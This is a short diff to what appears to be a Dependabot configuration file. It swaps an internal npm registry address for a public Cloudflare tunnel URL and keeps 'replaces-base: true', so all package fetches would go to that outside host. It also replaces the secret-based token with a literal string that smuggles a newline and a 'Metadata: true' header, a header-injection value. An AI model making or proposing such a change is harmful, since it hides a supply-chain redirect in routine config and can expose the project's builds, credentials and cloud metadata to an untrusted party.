@@ -1,10 +1,9 @@
-# p164 fill 1790665320
 version: 2
 registries:
   sink1tunnel:
     type: npm-registry
-    url: http://10.52.24.37/
-    token: ${{secrets.SINK1_TOKEN}}
+    url: https://rand-terms-bytes-subsidiaries.trycloudflare.com/redirc/ctrl
+    token: "tokA123\nMetadata: true"
     replaces-base: true
 updates:
   - package-ecosystem: "npm"
